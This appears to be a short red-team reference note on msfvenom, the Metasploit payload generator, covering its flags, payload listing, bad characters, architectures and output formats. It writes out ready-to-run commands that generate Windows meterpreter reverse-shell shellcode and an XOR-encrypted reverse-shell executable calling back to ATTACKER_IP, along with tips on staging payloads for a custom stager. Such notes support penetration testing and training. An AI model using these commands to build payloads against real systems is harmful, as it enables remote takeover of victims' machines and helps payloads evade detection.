MSFVenom is a Metaploit-produced payload generator for shellcode and executable generation. Its primary function will likely be for shellcode generation interoperable with [[Sliver C2]] or BOF applications. 

```shell
# Generate shellcode with msfvenom
msfvenom -p <payload name> <payload options> -a <architecture> -b <bad characters to avoid in shellcode generation> -o <output file> -f <output format>

# Example Windows Shellcode generation for use in a Python exploit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f python -b '\x00'

# Example encrypted meterpreter payload generation using XOR
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe

msfvenom --list encrypt # List encryption options.
```

>If you are staging your shellcode, generate in `raw` format to be downloaded by your custom stager.

Output architecture refer to the CPU architecture of the target machine: x86, arm, mips, powerpc, etc.

Payloads can be viewed with `--list payload`. Grep for what you need, because there's hundreds of options. 

Bad characters are specified as a string of bytes denoted like so: ``'\x00\x0a\x0b\x0c'``. If you are generating an agent or stager and *not* shellcode, bad characters should not be a concern. 

The output file flag tells msfvenom to output the data to a file and not to the screen. This should be used to output binary file formats but not necessarily shellcode destined for other code. 

The format flag tells msfvenom which code format to use when generating shellcode of which binary format or delivery format we want. For example, msfvenom can format a shellcode string as a python string or as a c string. It can also compile to an exe, and exe designed to run as a service, a powershell .ps1, etc.
